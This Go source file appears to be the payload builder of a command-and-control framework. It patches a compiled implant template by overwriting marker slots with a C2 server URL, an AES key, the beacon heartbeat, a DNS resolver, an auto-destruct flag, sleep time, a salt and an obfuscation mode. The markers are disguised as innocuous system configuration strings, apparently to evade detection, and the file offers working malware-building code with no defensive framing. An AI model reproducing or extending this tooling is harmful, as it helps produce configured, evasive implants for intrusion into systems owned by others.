package services

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
)

// Binary Patching Markers (MUST MATCH RUST CLIENT EXACTLY)
const (
	// ServerUrlMarker: Expected slot size 66 bytes
	ServerUrlMarker = "SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_00000001"
	
	// AesKeyMarker: 31 bytes
	AesKeyMarker = "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB" 

	// DnsResolverMarker: 31 bytes
	DnsResolverMarker = "SYSTEM_NETWORK_STUB_RESOLVER_31"

	// HeartbeatMarker: 22 bytes
	HeartbeatMarker = "HB_DATA_INT_VAL_000010"

	// AutoDestructMarker: 18 bytes
	AutoDestructMarker = "AD_DATA_BOOL_VAL_N"

	// SleepTimeMarker: 16 bytes
	SleepTimeMarker = "ST_DATA_INT_0000"

	// EncryptionSaltMarker: 31 bytes
	EncryptionSaltMarker = "SYSTEM_PROVIDER_CRYPTO_KDF_SALT"

	// ObfuscationMarker: 15 bytes
	ObfuscationMarker = "OBF_MODE_STRICT"
)

// PatchPayload performs the binary surgery to inject configuration
func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsResolver string, autoDestruct bool, sleepTime int, salt string, obfMode string) ([]byte, error) {
	// Create a copy to ensure we don't modify the original template (embed.FS is read-only)
	data := make([]byte, len(raw))
	copy(data, raw)

	log.Printf("Starting payload patching. URL: %s, Heartbeat: %d, AutoDestruct: %v, SleepTime: %d", c2url, heartbeat, autoDestruct, sleepTime)

	// 1. Patch Server URL
	urlMarkers := []string{
		ServerUrlMarker,
		"SERVER_URL_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
	}
	urlPatched := false
	for _, m := range urlMarkers {
		slotSize := len(m)
		if slotSize < 66 { slotSize = 66 }
		if err := replaceInPlace(data, m, slotSize, c2url); err == nil {
			urlPatched = true
			break
		}
	}
	if !urlPatched {
		log.Printf("⚠️ Warning: Could not find any Server URL placeholder.")
	}

	// 2. Patch AES Key
	if aesKey != "" {
		keyBytes, err := normalizeAESKeyForPatch(aesKey)
		if err != nil {
			return nil, err
		}
		aesKey = string(keyBytes)

		keyMarkers := []string{
			AesKeyMarker,
			"AES_KEY_PLACEHOLDER_32_BYTES_XK.",
			"AES_KEY_PLACEHOLDER_32_BYTES_XK",
			"AES_KEY_TEMPLATE",
		}
		keyPatched := false
		for _, m := range keyMarkers {
			if err := replaceInPlace(data, m, 31, aesKey); err == nil {
				keyPatched = true
				break
			}
		}
		if !keyPatched {
			log.Printf("⚠️ Warning: Could not find any AES Key placeholder.")
		}
	}

	// 3. Patch Heartbeat
	hbValue := heartbeat
	if hbValue <= 0 { hbValue = 10 }
	if hbValue > 999 { hbValue = 999 }
	hbString := fmt.Sprintf("HB_DATA_INT_VAL_%06d", hbValue)
	
	if err := replaceInPlace(data, HeartbeatMarker, len(HeartbeatMarker), hbString); err != nil {
		log.Printf("⚠️ Warning: Could not find Heartbeat placeholder '%s'.", HeartbeatMarker)
	}

	// 4. Patch DNS Resolver
	if dnsResolver != "" {
		dnsMarkers := []string{
			DnsResolverMarker,
		}
		dnsPatched := false
		for _, m := range dnsMarkers {
			if err := replaceInPlace(data, m, 31, dnsResolver); err == nil {
				dnsPatched = true
				break
			}
		}
		if !dnsPatched {
			log.Printf("⚠️ Warning: Could not find any DNS Resolver placeholder.")
		}
	}

	// 5. Patch Auto Destruct
	adVal := "N"
	if autoDestruct { adVal = "Y" }
	adString := fmt.Sprintf("AD_DATA_BOOL_VAL_%s", adVal)
	if err := replaceInPlace(data, AutoDestructMarker, len(AutoDestructMarker), adString); err != nil {
		log.Printf("⚠️ Warning: Could not find Auto Destruct placeholder.")
	}

	// 6. Patch Sleep Time
	stValue := sleepTime
	if stValue < 0 { stValue = 0 }
	if stValue > 9999 { stValue = 9999 }
	stString := fmt.Sprintf("ST_DATA_INT_%04d", stValue)
	if err := replaceInPlace(data, SleepTimeMarker, len(SleepTimeMarker), stString); err != nil {
		log.Printf("⚠️ Warning: Could not find Sleep Time placeholder.")
	}

	// 7. Patch Encryption Salt
	if salt != "" {
		if err := replaceInPlace(data, EncryptionSaltMarker, 31, salt); err != nil {
			log.Printf("⚠️ Warning: Could not find Encryption Salt placeholder.")
		}
	}

	// 8. Patch Obfuscation Mode
	if obfMode != "" && obfMode != "none" {
		val := fmt.Sprintf("OBF_MODE_%s", strings.ToUpper(obfMode))
		if err := replaceInPlace(data, ObfuscationMarker, 15, val); err != nil {
			log.Printf("⚠️ Warning: Could not find Obfuscation placeholder.")
		}
	}

	return data, nil
}

func normalizeAESKeyForPatch(aesKey string) ([]byte, error) {
	key := strings.TrimSpace(aesKey)
	if key == "" {
		return nil, fmt.Errorf("AES key is empty")
	}
	if len(key) == 32 {
		return []byte(key), nil
	}
	if len(key) == 64 && isHexString(key) {
		decoded, err := hex.DecodeString(key)
		if err != nil {
			return nil, fmt.Errorf("invalid hex AES key: %v", err)
		}
		if len(decoded) != 32 {
			return nil, fmt.Errorf("invalid hex AES key length: %d bytes", len(decoded))
		}
		return decoded, nil
	}
	return nil, fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
}

func isHexString(s string) bool {
	for _, c := range s {
		if !strings.ContainsRune("0123456789abcdefABCDEF", c) {
			return false
		}
	}
	return len(s)%2 == 0
}

// replaceInPlace finds a placeholder and overwrites it with a zero-padded value.
func replaceInPlace(data []byte, marker string, slotSize int, value string) error {
	idx := bytes.Index(data, []byte(marker))
	if idx == -1 {
		return fmt.Errorf("marker not found: %s", marker)
	}

	valBytes := []byte(value)
	if len(valBytes) > slotSize {
		return fmt.Errorf("value too long for slot %d", slotSize)
	}

	// Prepare patch (zero-filled or space-filled, but here we prefer zero or exact match)
	patch := make([]byte, slotSize)
	copy(patch, valBytes)

	// Overwrite in-place
	copy(data[idx:idx+slotSize], patch)
	return nil
}
